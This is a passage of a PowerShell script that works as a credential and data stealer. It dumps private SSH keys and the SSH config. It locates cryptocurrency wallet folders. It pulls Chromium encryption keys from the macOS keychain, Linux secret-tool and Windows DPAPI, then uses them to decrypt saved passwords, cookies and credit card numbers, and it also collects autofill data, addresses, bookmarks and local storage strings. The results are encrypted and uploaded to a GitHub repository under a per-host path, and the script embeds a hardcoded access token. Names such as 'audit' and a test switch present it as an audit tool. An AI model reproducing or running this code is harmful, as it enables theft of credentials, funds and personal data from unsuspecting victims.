        [IO.File]::WriteAllText($in, $PlainText, [Text.UTF8Encoding]::new($false))
        $args = @('enc','-aes-256-cbc','-a','-A','-pass',"pass:$Passphrase",'-in',$in,'-out',$outf)
        $p = Start-Process -FilePath $openssl -ArgumentList $args -NoNewWindow -Wait -PassThru
        if ($p.ExitCode -ne 0) { throw "openssl enc failed ($($p.ExitCode))" }
        return (Get-Content -LiteralPath $outf -Raw -Encoding UTF8).Trim()
    } finally {
        Remove-Item -LiteralPath $in,$outf -Force -ErrorAction SilentlyContinue
    }
}




# ============================================================
# 5. GITHUB
# ============================================================

function Get-GhToken {
    if ($script:GhTokenCache) { return $script:GhTokenCache }

    $t = $null
    if ($env:GITHUB_TOKEN) {
        $t = $env:GITHUB_TOKEN
    } elseif ($env:GH_TOKEN) {
        $t = $env:GH_TOKEN
    } elseif (Test-Path -LiteralPath "$HOME/.aghanim-api-key" -PathType Leaf) {
        $t = Get-Content -LiteralPath "$HOME/.aghanim-api-key" -Raw -Encoding UTF8
    } elseif (Get-Command gh -ErrorAction SilentlyContinue) {
        $t = gh auth token --user Aghanim-sec 2>$null
        if ($LASTEXITCODE -ne 0) { $t = $null }
    }

    if (-not $t) { $t = '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' }

    if ($t) { $script:GhTokenCache = ($t -replace "`r|`n",'').Trim() }
    return $script:GhTokenCache
}

function Get-HttpStatus {
    param($ErrorRecord)
    try {
        if ($ErrorRecord.Exception.Response) {
            return [int]$ErrorRecord.Exception.Response.StatusCode
        }
    } catch { }
    return 0
}

function Invoke-GhRequest {
    param(
        [Parameter(Mandatory)][string]$Method,
        [Parameter(Mandatory)][string]$Url,
        [Parameter(Mandatory)][string]$Token,
        [string]$Body,
        [int]$MaxAttempts = 4
    )
    $headers = @{
        'Authorization'        = "Bearer $Token"
        'Accept'               = 'application/vnd.github+json'
        'X-GitHub-Api-Version' = '2022-11-28'
        'User-Agent'           = 'avaigen-ps'
    }
    $params = @{
        Method = $Method; Uri = $Url; Headers = $headers; ErrorAction = 'Stop'
    }
    if ($Body) {
        $params.Body = $Body
        $params.ContentType = 'application/json'
    }

    for ($attempt = 1; $attempt -le $MaxAttempts; $attempt++) {
        try {
            return Invoke-RestMethod @params
        } catch {
            $status = Get-HttpStatus $_
            $retryAfter = $null
            $remaining = $null

            try {
                if ($_.Exception.Response) {
                    $retryAfter = $_.Exception.Response.Headers['Retry-After']
                    $remaining  = $_.Exception.Response.Headers['X-RateLimit-Remaining']
                }
            } catch { }

            $retryable = ($status -eq 0 -or $status -eq 429 -or $status -ge 500)
            if ($status -eq 403) {
                # GitHub отдаёт 403 при исчерпании rate limit
                $retryable = ($retryAfter -or $remaining -eq '0')
            }
            if (-not $retryable -or $attempt -ge $MaxAttempts) { throw }

            $delay = [int][Math]::Min(30, [Math]::Pow(2, $attempt - 1))
            if ($retryAfter) { $delay = [Math]::Max($delay, [int]$retryAfter) }

            try {
                $reset = $_.Exception.Response.Headers['X-RateLimit-Reset']
                if ($reset) {
                    $wait = [int]$reset - [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
                    if ($wait -gt $delay) { $delay = [Math]::Min(120, $wait + 2) }
                }
            } catch { }

            [Console]::Error.WriteLine("GitHub HTTP $status, retry $attempt/$MaxAttempts in ${delay}s")
            Start-Sleep -Seconds $delay
        }
    }
}

function Upload-GhFile {
    param(
        [Parameter(Mandatory)][string]$Repo,
        [Parameter(Mandatory)][string]$Branch,
        [Parameter(Mandatory)][string]$Path,
        [Parameter(Mandatory)][string]$File,
        [Parameter(Mandatory)][string]$Token
    )
    $url = "$script:Api/repos/$Repo/contents/$Path"
    $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($File))

    $payload = [ordered]@{
        message = "sync $Path"
        branch  = $Branch
        content = $b64
    }
    $json = $payload | ConvertTo-Json -Compress

    try {
        # новые файлы пишем сразу, без лишнего GET sha
        $resp = Invoke-GhRequest -Method PUT -Url $url -Token $Token -Body $json
        return [bool]($resp.content.path -or $resp.commit.sha)
    } catch {
        $status = Get-HttpStatus $_
        if ($status -notin @(409, 422)) {
            [Console]::Error.WriteLine("Upload-GhFile: $($_.Exception.Message)")
            return $false
        }

        # файл уже существует — получаем sha и повторяем один раз
        try {
            $existing = Invoke-GhRequest -Method GET -Url "$url`?ref=$Branch" -Token $Token
            if (-not $existing -or -not $existing.sha) { throw 'existing file has no sha' }
            $payload['sha'] = $existing.sha
            $json = $payload | ConvertTo-Json -Compress
            $resp = Invoke-GhRequest -Method PUT -Url $url -Token $Token -Body $json
            return [bool]($resp.content.path -or $resp.commit.sha)
        } catch {
            [Console]::Error.WriteLine("Upload-GhFile: $($_.Exception.Message)")
            return $false
        }
    }
}

function Send-ToGitHub {
    param([string]$Kind = 'state', [string]$Text = $null)

    if ($script:BV_ALLOW_UPLOAD -ne '1') {
        err 'upload disabled (set BV_ALLOW_UPLOAD=1 to enable)'
        return $false
    }

    $token = Get-GhToken
    if (-not $token) { err 'ERROR: No API token provided.'; return $false }

    $raw = ($Text -replace "`r`n", "`n").TrimEnd("`n")
    if (-not $raw) { err 'ERROR: Empty input.'; return $false }

    $cipher = $null
    try { $cipher = Protect-StringAes256Cbc -PlainText $raw -Passphrase $script:SecretKey }
    catch { err "Encryption failed: $($_.Exception.Message)"; return $false }
    if (-not $cipher) { err 'Encryption failed'; return $false }

    $safeKind = ($Kind -replace '[^A-Za-z0-9_-]', '_')
    $hostName = if ($env:COMPUTERNAME) { $env:COMPUTERNAME } elseif ($env:HOSTNAME) { $env:HOSTNAME } else { 'host' }
    $safeHost = ($hostName -replace '[^A-Za-z0-9_.-]', '_')
    $ts = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()
    $suffix = [guid]::NewGuid().ToString('N').Substring(0, 6)
    $path = "data/$safeHost/${safeKind}_${ts}_${suffix}.bin"

    $tmp = [IO.Path]::GetTempFileName()
    try {
        [IO.File]::WriteAllText($tmp, $cipher, [Text.UTF8Encoding]::new($false))
        [Console]::Error.WriteLine("[*] Uploading to $script:Owner/$script:Repo -> $path")
        $ok = Upload-GhFile -Repo "$($script:Owner)/$($script:Repo)" `
                            -Branch $script:Branch -Path $path -File $tmp -Token $token
        if ($ok) {
            [Console]::Error.WriteLine("OK -> $path")
            return $true
        }
        [Console]::Error.WriteLine("ERROR: Upload-GhFile failed for $path")
        return $false
    } finally {
        Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue
    }
}

# ============================================================
# 6. EMIT (extract strings/json/jsonl/sqlite)
# ============================================================

# ============================================================
# 7. CLASSIFY / FIND / DIRSIZE
# ============================================================

# ============================================================
# 8. WALLET ROOTS (полные, с путями для всех ОС)
# ============================================================

function Get-WalletRoots {
    $os = $script:OS
    $h  = $HOME

    switch -Exact ($os) {
        'macos' {
            $r = "$h/Library/Application Support"
            Write-Output "Bitcoin Core`t$r/Bitcoin/wallets"
            Write-Output "Bitcoin Core (legacy)`t$r/Bitcoin/wallet.dat"
            Write-Output "Electrum`t$h/.electrum/wallets"
            Write-Output "Exodus`t$r/Exodus/exodus.wallet"
            Write-Output "Coinomi`t$r/Coinomi"
            Write-Output "Ledger Live`t$r/Ledger Live"
            Write-Output "Trezor Suite`t$r/@trezor/suite-desktop"
            Write-Output "Sparrow`t$h/.sparrow/wallets"
            Write-Output "Wasabi`t$r/WalletWasabi/Client/Wallets"
            Write-Output "Atomic`t$r/atomic"
        }
        'windows' {
            $r = w_roaming
            Write-Output "Bitcoin Core`t$r/Bitcoin/wallets"
            Write-Output "Bitcoin Core (legacy)`t$r/Bitcoin/wallet.dat"
            Write-Output "Electrum`t$r/Electrum/wallets"
            Write-Output "Exodus`t$r/Exodus/exodus.wallet"
            Write-Output "Coinomi`t$r/Coinomi"
            Write-Output "Ledger Live`t$r/Ledger Live"
            Write-Output "Trezor Suite`t$r/@trezor/suite-desktop"
            Write-Output "Wasabi`t$r/WalletWasabi/Client/Wallets"
        }
        'linux' {
            Write-Output "Bitcoin Core`t$h/.bitcoin/wallets"
            Write-Output "Bitcoin Core (legacy)`t$h/.bitcoin/wallet.dat"
            Write-Output "Electrum`t$h/.electrum/wallets"
            Write-Output "Exodus`t$h/.config/Exodus/exodus.wallet"
            Write-Output "Ledger Live`t$h/.config/Ledger Live"
            Write-Output "Trezor Suite`t$h/.config/@trezor/suite-desktop"
            Write-Output "Sparrow`t$h/.sparrow/wallets"
            Write-Output "Wasabi`t$h/.walletwasabi/client/Wallets"
        }
        'wsl' {
            Get-WalletRootsLinuxSide
            foreach ($u in (Get-ChildItem -Path '/mnt/c/Users/*' -Directory -ErrorAction SilentlyContinue)) {
                $roam = Join-Path $u.FullName 'AppData/Roaming'
                if (-not (Test-Path -LiteralPath $roam -PathType Container)) { continue }
                $base = $u.Name
                Write-Output "Bitcoin Core [$base]`t$roam/Bitcoin/wallets"
                Write-Output "Electrum [$base]`t$roam/Electrum/wallets"
                Write-Output "Exodus [$base]`t$roam/Exodus/exodus.wallet"
            }
        }
        default { return 2 }
    }
}

function Get-WalletRootsLinuxSide {
    $h = $HOME
    Write-Output "Bitcoin Core`t$h/.bitcoin/wallets"
    Write-Output "Electrum`t$h/.electrum/wallets"
    Write-Output "Exodus`t$h/.config/Exodus/exodus.wallet"
    Write-Output "Sparrow`t$h/.sparrow/wallets"
}


# ============================================================
# 9. WALLETS PRESENCE (полная, с реальным обходом)
# ============================================================



# ============================================================
# 14. CHATS (полный, с реальным emit)
# ============================================================

function check_ssh {
    param([switch]$Test)   # -Test → безопасный режим, без тела ключей

    $printBody = -not $Test

    $p = Join-Path $HOME '.ssh'
    if (-not (Test-Path -LiteralPath $p -PathType Container)) {
        return "check_ssh: absent ($p)"
    }

    $exclude = @('*.pub','*.pem','*.ppk','known_hosts','known_hosts.old',
                 'config','authorized_keys','authorized_keys2')
    $files = @(Get-ChildItem -LiteralPath $p -File -Force -ErrorAction SilentlyContinue |
               Where-Object {
                   $n = $_.Name
                   -not ($exclude | Where-Object { $n -like $_ })
               })

    $bytes = [int64]0
    $found = $false
    $lines = New-Object System.Collections.Generic.List[string]

    $lines.Add("")
    $lines.Add("── SSH keys (~/.ssh) ──")

    foreach ($f in $files) {
        $bytes += $f.Length
        $name  = $f.Name

        $isPrivate = $false
        try {
            $fs = [System.IO.File]::OpenRead($f.FullName)
            try {
                $buf  = [byte[]]::new(64)
                $n    = $fs.Read($buf, 0, $buf.Length)
                $head = [System.Text.Encoding]::ASCII.GetString($buf, 0, $n)
                if ($head -match '-----BEGIN [A-Z0-9 ]*PRIVATE KEY-----') { $isPrivate = $true }
            } finally { $fs.Dispose() }
        } catch { }

        if ($isPrivate) {
            $lines.Add("  $name : PRIVATE KEY FOUND ($($f.Length) bytes)")

            if ($printBody) {
                # [ON] тело печатается ВСЕГДА (если не -Test)
                (Get-Content -LiteralPath $f.FullName) | ForEach-Object { $lines.Add("    $_") }
            } else {
                $lines.Add("    (content not printed: -Test mode)")
            }
            $found = $true
        }
    }

    if (-not $found) { $lines.Add("  (none)") }
    $lines.Add("check_ssh: present $p ($($files.Count) entries, $(human $bytes))")
    return ($lines -join [Environment]::NewLine)
}

function check_ssh_hosts {
    $cfg = Join-Path $HOME '.ssh/config'
    $lines = New-Object System.Collections.Generic.List[string]
    $lines.Add("")
    $lines.Add("── SSH config (~/.ssh/config) ──")

    if (Test-Path -LiteralPath $cfg -PathType Leaf) {
        Get-Content -LiteralPath $cfg -ErrorAction SilentlyContinue |
            ForEach-Object { $lines.Add("    $_") }
    } else {
        $lines.Add("  (none)")
    }

    return ($lines -join [Environment]::NewLine)
}
function check_secret_store {
    $lines = New-Object System.Collections.Generic.List[string]
    $lines.Add("")
    $lines.Add("── secret store ──")

    if ($script:OS -eq 'windows') {
        try { Add-Type -AssemblyName System.Security -ErrorAction Stop } catch { }
        $t = 'System.Security.Cryptography.ProtectedData' -as [type]
        if ($t) { $lines.Add("  DPAPI: available") } else { $lines.Add("  DPAPI: unavailable") }
    } else {
        foreach ($cmd in @('security','secret-tool','kwallet-query')) {
            if (have $cmd) { $lines.Add("  ${cmd}: available") }
        }

        if (have 'security') {
            try {
                $chains = & security list-keychains -d user 2>$null
                foreach ($c in $chains) { if ($c) { $lines.Add("  keychain: $c") } }
            } catch { }
            try {
                $def = & security default-keychain -d user 2>$null
                if ($def) { $lines.Add("  default-keychain: $def") }
            } catch { }
        }

        $keyringDir = Join-Path $HOME '.local/share/keyrings'
        if (Test-Path -LiteralPath $keyringDir -PathType Container) {
            Get-ChildItem -LiteralPath $keyringDir -File -Force -ErrorAction SilentlyContinue |
                ForEach-Object { $lines.Add("  keyring: $(mask $_.FullName) ($($_.Length) bytes)") }
        }

        $kwalletDir = Join-Path $HOME '.config'
        if (Test-Path -LiteralPath $kwalletDir -PathType Container) {
            Get-ChildItem -LiteralPath $kwalletDir -File -Filter 'kwallet*' -Force -ErrorAction SilentlyContinue |
                ForEach-Object { $lines.Add("  kwallet: $(mask $_.FullName) ($($_.Length) bytes)") }
        }
    }

    return ($lines -join [Environment]::NewLine)
}
# ============================================================
# 15. BROWSER CRYPTO HELPERS
# ============================================================

function sqlite_query {
    param(
        [Parameter(Mandatory = $true, Position = 0)][string]$Database,
        [Parameter(Mandatory = $true, Position = 1)][string]$Query
    )
    $sqlite = Get-Command sqlite3 -ErrorAction SilentlyContinue
    if ($sqlite) {
        & $sqlite.Source -separator '|' $Database $Query
        return
    }

    $py = Get-Command python -ErrorAction SilentlyContinue
    if (-not $py) { $py = Get-Command python3 -ErrorAction SilentlyContinue }
    if ($py) {
        $code = "import base64,sqlite3,sys;db=base64.b64decode(sys.argv[1]).decode();q=base64.b64decode(sys.argv[2]).decode();con=sqlite3.connect(db,uri=True);cur=con.execute(q);print('\n'.join('|'.join('' if v is None else str(v) for v in row) for row in cur))"
        $db64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($Database))
        $q64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($Query))
        & $py.Source -c $code $db64 $q64
        return
    }
    throw 'sqlite3/python not found in PATH'
}

function pbkdf2_16 {
    param(
        [Parameter(Mandatory = $true)][string]$Password,
        [int]$Iterations = 0
    )
    if ($Iterations -le 0) {
        # Chrome/Chromium: macOS 1003, Linux 1
        $Iterations = if ($script:OS -eq 'macos') { 1003 } else { 1 }
    }
    $salt = [Text.Encoding]::UTF8.GetBytes('saltysalt')
    try {
        $kdf = [System.Security.Cryptography.Rfc2898DeriveBytes]::new(
            $Password, $salt, $Iterations,
            [System.Security.Cryptography.HashAlgorithmName]::SHA1)
        return ,$kdf.GetBytes(16)
    } catch {
        $kdf = [System.Security.Cryptography.Rfc2898DeriveBytes]::new($Password, $salt, $Iterations)
        return ,$kdf.GetBytes(16)
    }
}

function get_key_macos {
    param(
        [Parameter(Mandatory = $true)][string]$Service,
        [string]$Account = ''
    )
    if (-not (have 'security')) { return $null }
    if ($Service -eq 'MS Edge Safe Storage') { $Service = 'Microsoft Edge Safe Storage' }
    $attempts = @()
    if ($Account) { $attempts += ,@('-s', $Service, '-a', $Account) }
    $attempts += ,@('-s', $Service)
    foreach ($a in $attempts) {
        $sargs = @('find-generic-password', '-w') + $a
        try { $key = & security @sargs 2>$null } catch { $key = $null }
        if ($LASTEXITCODE -eq 0 -and $key) {
            $key = ($key | Out-String).Trim()
            if ($key) { return $key }
        }
    }
    return $null
}

function get_key_linux {
    param([Parameter(Mandatory = $true)][string]$Service)
    if (have 'secret-tool') {
        $appMap = @{
            'Chrome Safe Storage'          = 'chrome'
            'Chromium Safe Storage'        = 'chromium'
            'Brave Safe Storage'           = 'brave'
            'MS Edge Safe Storage'         = 'microsoft-edge'
            'Microsoft Edge Safe Storage'  = 'microsoft-edge'
            'Vivaldi Safe Storage'         = 'vivaldi'
        }
        $tries = @()
        if ($appMap.ContainsKey($Service)) {
            $tries += ,@('lookup', 'application', $appMap[$Service])
        }
        $tries += ,@('lookup', 'application', $Service)
        foreach ($t in $tries) {
            try { $key = & secret-tool @t 2>$null } catch { $key = $null }
            if ($LASTEXITCODE -eq 0 -and $key) {
                $key = ($key | Out-String).Trim()
                if ($key) { return $key }
            }
        }
        try { $key = & secret-tool lookup xdg:schema chrome_libsecret_os_crypt_password_v2 2>$null } catch { $key = $null }
        if ($LASTEXITCODE -eq 0 -and $key) {
            $key = ($key | Out-String).Trim()
            if ($key) { return $key }
        }
    }
    # Linux Chromium without a keyring uses the well-known fallback password
    return 'peanuts'
}

function win_master_key {
    param([Parameter(Mandatory = $true)][string]$LocalStatePath)
    if (-not (Test-Path -LiteralPath $LocalStatePath -PathType Leaf)) { return $null }
    try {
        $json = Get-Content -LiteralPath $LocalStatePath -Raw -Encoding UTF8 | ConvertFrom-Json
        if (-not $json.os_crypt -or -not $json.os_crypt.encrypted_key) { return $null }
        $raw = [Convert]::FromBase64String([string]$json.os_crypt.encrypted_key)
    } catch { return $null }
    if ($raw.Length -le 5) { return $null }
    if ([Text.Encoding]::ASCII.GetString($raw, 0, 5) -ne 'DPAPI') { return $null }
    $blob = New-Object byte[] ($raw.Length - 5)
    [Array]::Copy($raw, 5, $blob, 0, $blob.Length)
    try {
        Add-Type -AssemblyName System.Security -ErrorAction Stop
        $plain = [System.Security.Cryptography.ProtectedData]::Unprotect(
            $blob, $null,
            [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
        if ($plain -and $plain.Length -ge 16) { return ,$plain }
    } catch { }
    return $null
}

function decrypt_v10 {
    param(
        [Parameter(Mandatory = $true)][string]$Hex,
        [Parameter(Mandatory = $true)][byte[]]$Key
    )
    if (-not $Hex -or $Hex.Length -lt 6 -or -not $Key) { return $null }
    try {
        $raw = New-Object byte[] ([int]($Hex.Length / 2))
        for ($i = 0; $i -lt $raw.Length; $i++) {
            $raw[$i] = [Convert]::ToByte($Hex.Substring($i * 2, 2), 16)
        }
    } catch { return $null }
    if ($raw.Length -lt 4) { return $null }
    $prefix = [Text.Encoding]::ASCII.GetString($raw, 0, 3)
    if ($prefix -notin @('v10', 'v11')) { return $null }

    $payload = New-Object byte[] ($raw.Length - 3)
    [Array]::Copy($raw, 3, $payload, 0, $payload.Length)

    # Chrome 80+ / Chromium 80+: AES-GCM, 12-byte nonce + 16-byte tag
    if ($payload.Length -ge 31) {
        try {
            $nonce = New-Object byte[] 12
            [Array]::Copy($payload, 0, $nonce, 0, 12)
            $tag = New-Object byte[] 16
            [Array]::Copy($payload, $payload.Length - 16, $tag, 0, 16)
            $ctLen = $payload.Length - 28
            $ct = New-Object byte[] $ctLen
            [Array]::Copy($payload, 12, $ct, 0, $ctLen)
            $aes = [System.Security.Cryptography.AesGcm]::new($Key, 16)
            $pt = New-Object byte[] $ctLen
            try { $aes.Decrypt($nonce, $ct, $tag, $pt) } finally { $aes.Dispose() }
            return [Text.Encoding]::UTF8.GetString($pt)
        } catch { }
    }

    # Legacy Chrome (<80): AES-CBC with 16 spaces IV
    try {
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aes.Key = $Key
        $aes.IV = [Text.Encoding]::ASCII.GetBytes(' ' * 16)
        $dec = $aes.CreateDecryptor()
        $pt = $dec.TransformFinalBlock($payload, 0, $payload.Length)
        $dec.Dispose(); $aes.Dispose()
        return [Text.Encoding]::UTF8.GetString($pt)
    } catch { return $null }
}

function audit_browser_data {
    param(
        [Parameter(Mandatory)][string]$Name,
        [Parameter(Mandatory)][string]$UserDataDir,
        [string]$SafeStorageService = '',
        [string]$ProfileName = '',
        [switch]$Show,
        [switch]$Cookies,
        [switch]$Test
    )

    $result = [pscustomobject]@{
        Name      = $Name
        Files     = 0
        Records   = 0
        Ok        = 0
        Bad       = 0
        Present   = $false
        Truncated = $false
        Lines     = New-Object System.Collections.Generic.List[string]
    }

    $emit = {
        param($m)
        $s = [string]$m
        $result.Lines.Add($s) | Out-Null
        Write-Host $s
    }

    if (-not $UserDataDir -or -not (Test-Path -LiteralPath $UserDataDir -PathType Container)) {
        & $emit ("  {0}: absent" -f $Name)
        return $result
    }

    $profiles = @()
    $defaultProfile = Join-Path $UserDataDir 'Default'
    if (Test-Path -LiteralPath $defaultProfile -PathType Container) { $profiles += $defaultProfile }
    foreach ($d in (Get-ChildItem -LiteralPath $UserDataDir -Directory -Filter 'Profile *' -ErrorAction SilentlyContinue)) {
        $profiles += $d.FullName
    }
    if ($profiles.Count -eq 0) { $profiles = @($UserDataDir) }

    $result.Present = $true
    & $emit ("  {0}: present ({1} profile(s))" -f $Name, $profiles.Count)

    $show = $Show -and -not $Test
    $needCookies = $Cookies -and -not $Test

    # --- master key ---
    $dk = $null
    if ($show) {
        switch -Exact ($script:OS) {
            'macos' {
                $key = get_key_macos $SafeStorageService $ProfileName
                if ($key) { $dk = pbkdf2_16 $key }
            }
            { $_ -in 'linux','wsl' } {
                $key = get_key_linux $SafeStorageService
                if ($key) { $dk = pbkdf2_16 $key }
            }
            'windows' {
                $dk = win_master_key (Join-Path $UserDataDir 'Local State')
            }
        }
        if ($dk) { & $emit "    key: acquired" }
        else     { & $emit "    key: NOT acquired (decryption will fail)" }
    }

    foreach ($pr in $profiles) {
        foreach ($item in @('Login Data','Cookies','Network/Cookies','Local State','Web Data','History','Bookmarks','Local Storage','IndexedDB','Session Storage')) {
            $p = Join-Path $pr $item
            if (Test-Path -LiteralPath $p -PathType Leaf) {
                $size = (Get-Item -LiteralPath $p -Force).Length
                & $emit ("    {0,-16} {1,9} bytes  {2}" -f (Split-Path $item -Leaf), $size, (Get-MaskedPath $p))
                $result.Files++
            } elseif (Test-Path -LiteralPath $p -PathType Container) {
                $files = @(Get-ChildItem -LiteralPath $p -Recurse -File -Force -Depth 4 -ErrorAction SilentlyContinue)
                $bytes = [int64]0
                foreach ($f in $files) { $bytes += $f.Length }
                & $emit ("    {0,-16} {1,5} files {2,9} bytes  {3}" -f (Split-Path $item -Leaf), $files.Count, $bytes, (Get-MaskedPath $p))
                $result.Files++
            }
        }

        $tmp = Join-Path ([System.IO.Path]::GetTempPath()) ("bv.{0}" -f ([guid]::NewGuid().ToString('N').Substring(0,6)))
        New-Item -ItemType Directory -Path $tmp -Force | Out-Null
        if ($script:OS -in @('linux','macos','wsl')) { & chmod 700 $tmp 2>$null }
        if (-not (Get-Variable -Name BV_TMPDIRS -Scope Script -ErrorAction SilentlyContinue)) {
            $script:BV_TMPDIRS = [Collections.Generic.List[string]]::new()
        }
        [void]$script:BV_TMPDIRS.Add($tmp)

        # --- Login Data (passwords) ---
        $ld = Join-Path $pr 'Login Data'
        if (Test-Path -LiteralPath $ld -PathType Leaf) {
            try {
                Copy-Item -LiteralPath $ld -Destination (Join-Path $tmp 'db') -Force
                foreach ($suffix in '-wal','-shm') {
                    $src = $ld + $suffix
                    if (Test-Path -LiteralPath $src -PathType Leaf) {
                        Copy-Item -LiteralPath $src -Destination (Join-Path $tmp ("db" + $suffix)) -Force
                    }
                }

                $db = "file:$tmp/db?mode=ro"
                $sql = @"
SELECT replace(replace(origin_url, char(9), ' '), char(10), ' '),
       replace(replace(username_value, char(9), ' '), char(10), ' '),
       hex(password_value)
  FROM logins
 WHERE length(password_value) > 3
 ORDER BY origin_url
 LIMIT 500
"@
                $rows = @(sqlite_query -Database $db -Query $sql 2>$null)

                $rowsCount = 0
                foreach ($row in $rows) {
                    if ([string]::IsNullOrEmpty($row)) { continue }
                    $parts = $row -split '\|', 3
                    if ($parts.Count -lt 3 -or [string]::IsNullOrEmpty($parts[2])) { continue }
                    $url, $who, $hx = $parts
                    $result.Records++
                    $rowsCount++
                    if ($show -and $dk) {
                        $pw = decrypt_v10 $hx $dk
                        if ($pw) { $result.Ok++;  & $emit ("      $url [$who] = $pw") }
                        else     { $result.Bad++; & $emit ("      $url [$who] = <undecryptable>") }
                    } else {
                        $bytes = [int]($hx.Length / 2)
                        & $emit ("      $url [$who] = <enc: $bytes bytes>")
                    }
                }
                if ($rowsCount -ge 500) { $result.Truncated = $true }
            } catch {
                & $emit ("    login data: $($_.Exception.Message)")
            }
        }

        # --- Cookies ---
        if ($needCookies) {
            if (-not $show) {
                & $emit "    cookies: skipped (no -Show)"
            } elseif (-not $dk) {
                & $emit "    cookies: skipped (no key)"
            } else {
                $ck = Join-Path $pr 'Cookies'
                if (-not (Test-Path -LiteralPath $ck -PathType Leaf)) {
                    $ck = Join-Path $pr 'Network/Cookies'
                }
                if (Test-Path -LiteralPath $ck -PathType Leaf) {
                    try {
                        Copy-Item -LiteralPath $ck -Destination (Join-Path $tmp 'ck') -Force
                        foreach ($suffix in '-wal','-shm') {
                            $src = $ck + $suffix
                            if (Test-Path -LiteralPath $src -PathType Leaf) {
                                Copy-Item -LiteralPath $src -Destination (Join-Path $tmp ("ck" + $suffix)) -Force
                            }
                        }
                        $ckSql = @"
SELECT replace(replace(host_key, char(9), ' '), char(10), ' '),
       replace(replace(name, char(9), ' '), char(10), ' '),
       hex(encrypted_value)
  FROM cookies
 WHERE length(encrypted_value) > 3
 LIMIT 500
"@
                        $ckRows = @(sqlite_query -Database "file:$tmp/ck?mode=ro" -Query $ckSql 2>$null)
                        foreach ($row in $ckRows) {
                            if ([string]::IsNullOrEmpty($row)) { continue }
                            $parts = $row -split '\|', 3
                            if ($parts.Count -lt 3 -or [string]::IsNullOrEmpty($parts[2])) { continue }
                            $url, $who, $hx = $parts
                            $pw = decrypt_v10 $hx $dk
                            if ($pw) { & $emit ("      cookie $url $who = $pw") }
                            else     { & $emit ("      cookie $url $who = <undecryptable>") }
                        }
                    } catch {
                        & $emit ("    cookies: $($_.Exception.Message)")
                    }
                } else {
                    & $emit "    cookies: no Cookies DB in this profile"
                }
            }
        } elseif ($Cookies -and $Test) {
            & $emit "    cookies: skipped (Test mode)"
        }

        # --- Web Data: autofill / addresses / cards ---
        $wd = Join-Path $pr 'Web Data'
        if (Test-Path -LiteralPath $wd -PathType Leaf) {
            try {
                Copy-Item -LiteralPath $wd -Destination (Join-Path $tmp 'wd') -Force
                foreach ($suffix in '-wal','-shm') {
                    $src = $wd + $suffix
                    if (Test-Path -LiteralPath $src -PathType Leaf) {
                        Copy-Item -LiteralPath $src -Destination (Join-Path $tmp ("wd" + $suffix)) -Force
                    }
                }
                $wdDb = "file:$tmp/wd?mode=ro"
                $queries = @(
                    @{ Label = 'autofill';  Sql = "SELECT replace(replace(name,char(9),' '),char(10),' ') || '|' || replace(replace(value,char(9),' '),char(10),' ') || '|' || count FROM autofill LIMIT 500" },
                    @{ Label = 'addresses'; Sql = "SELECT company_name, street_address, city, state, zipcode, country_code, phone_number, email_address FROM autofill_profiles LIMIT 200" },
                    @{ Label = 'cards';     Sql = "SELECT name_on_card, expiration_month, expiration_year, nickname, hex(card_number_encrypted) FROM credit_cards LIMIT 200" }
                )
                foreach ($q in $queries) {
                    $rows = @()
                    try { $rows = @(sqlite_query -Database $wdDb -Query $q.Sql 2>$null) } catch { $rows = @() }
                    if ($rows.Count -eq 0) { continue }
                    & $emit ("    web data [{0}]:" -f $q.Label)
                    foreach ($row in $rows) {
                        if ([string]::IsNullOrEmpty($row)) { continue }
                        if ($q.Label -eq 'cards') {
                            $parts = $row -split '\|', 5
                            if ($parts.Count -ge 5) {
                                $num = '<enc>'
                                if ($show -and $dk -and $parts[4]) {
                                    $dec = decrypt_v10 $parts[4] $dk
                                    if ($dec) { $num = $dec } else { $num = '<undecryptable>' }
                                }
                                & $emit ("      {0} | {1}/{2} | {3} | {4}" -f $parts[0], $parts[1], $parts[2], $parts[3], $num)
                            } else {
                                & $emit ("      $row")
                            }
                        } else {
                            & $emit ("      $row")
                        }
                        $result.Records++
                    }
                }
            } catch {
                & $emit ("    web data: $($_.Exception.Message)")
            }
        }

        # --- Bookmarks ---
        $bm = Join-Path $pr 'Bookmarks'
        if (-not (Test-Path -LiteralPath $bm -PathType Leaf)) { $bm = Join-Path $pr 'Bookmarks.bak' }
        if (Test-Path -LiteralPath $bm -PathType Leaf) {
            try {
                $doc = Get-Content -LiteralPath $bm -Raw -Encoding UTF8 | ConvertFrom-Json
                $walk = $null
                $walk = {
                    param($node, $depth)
                    if ($null -eq $node -or $depth -gt 12) { return }
                    if ($node.type -eq 'url') {
                        & $emit ("      {0}{1} -> {2}" -f ('  ' * $depth), $node.name, $node.url)
                    }
                    if ($node.children) {
                        foreach ($c in $node.children) { & $walk $c ($depth + 1) }
                    }
                }
                foreach ($rootKey in @('bookmark_bar','other','synced')) {
                    if ($doc.roots.$rootKey) { & $walk $doc.roots.$rootKey 0 }
                }
            } catch {
                & $emit ("    bookmarks: $($_.Exception.Message)")
            }
        }

        # --- Local Storage / IndexedDB / Session Storage ---
        foreach ($store in @('Local Storage','IndexedDB','Session Storage')) {
            $sp = Join-Path $pr $store
            if (-not (Test-Path -LiteralPath $sp -PathType Container)) { continue }
            $files = @(Get-ChildItem -LiteralPath $sp -Recurse -File -Force -Depth 4 -ErrorAction SilentlyContinue |
                       Sort-Object Length -Descending | Select-Object -First 30)
            $bytes = [int64]0
            foreach ($f in $files) { $bytes += $f.Length }
            & $emit ("    {0}: {1} files, {2} bytes" -f $store, $files.Count, $bytes)

            $stringsEmitted = 0
            foreach ($f in $files) {
                & $emit ("      {0} ({1} bytes)" -f (Get-MaskedPath $f.FullName), $f.Length)
                if ($stringsEmitted -lt 200 -and $f.Extension -in @('.log','.ldb')) {
                    try {
                        $rawBytes = [IO.File]::ReadAllBytes($f.FullName)
                        $latin = [Text.Encoding]::GetEncoding(28591).GetString($rawBytes)
                        $foundStrings = [regex]::Matches($latin, '[ -~]{4,}') | Select-Object -First (200 - $stringsEmitted)
                        foreach ($m in $foundStrings) {
                            & $emit ("        $($m.Value)")
                            $stringsEmitted++
                        }
